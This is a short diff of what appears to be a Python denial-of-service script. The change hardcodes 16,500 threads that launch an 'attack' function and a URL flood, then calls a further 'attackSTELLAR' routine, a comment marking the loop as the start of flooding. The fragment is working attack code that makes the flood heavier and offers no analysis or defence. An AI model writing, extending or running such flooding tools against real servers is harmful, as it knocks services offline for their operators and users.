@@ -131,11 +131,12 @@ def LaunchSTELLAR(url, timer):
             s.close()
 
 # Mulai ( start flooding )
-for i in range(int(numberOfThreads)):
+
+default_threads = 16500
+for i in range(default_threads):
     threading.Thread(target=attack, args=(i,)).start()
 threading.Thread(target=flood_url).start()
 
-# Additional stellar attack
 attackSTELLAR(url_stellar, timer_stellar, threads_stellar)
 
 # NOTE
